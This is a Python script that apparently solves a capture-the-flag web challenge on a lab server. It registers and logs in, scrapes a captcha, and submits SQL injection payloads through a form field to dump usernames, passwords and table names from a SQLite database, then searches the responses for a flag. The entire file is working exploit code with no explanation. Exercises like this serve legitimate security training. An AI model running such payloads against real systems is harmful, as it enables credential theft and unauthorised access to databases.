import sys, requests, urllib3, re, time
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
urllib3.disable_warnings()
BASE = "http://chatelaine.cylabacademy.net:19299/"
s = requests.Session()
s.post(BASE + "register.php", data={"user": "exfil7", "pass": "pass7"}, timeout=15)
s.post(BASE + "index.php", data={"username": "exfil7", "password": "pass7"}, timeout=15)
payloads = [
    "' || (SELECT GROUP_CONCAT(nameuser) FROM startup_users)",
    "' || (SELECT GROUP_CONCAT(wordpass) FROM startup_users)",
    "'||(SELECT GROUP_CONCAT(tbl_name) FROM sqlite_master)",
]
for p in payloads:
    r = s.get(BASE + "index.php", timeout=15)
    cap = re.search(r'name="captcha" value="([^"]+)"', r.text)
    if not cap:
        print("pas de captcha")
        break
    r2 = s.post(BASE + "contribute.php", data={"captcha": cap.group(1), "moneys": p}, timeout=15)
    txt = re.sub(r"<[^>]+>", " ", r2.text)
    txt = re.sub(r"\s+", " ", txt)
    print("=== payload: %s" % p[:70])
    print("   ", txt[:400])
    m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", r2.text)
    if m:
        print(">>> FLAG:", m.group(0))
        break
    time.sleep(0.3)
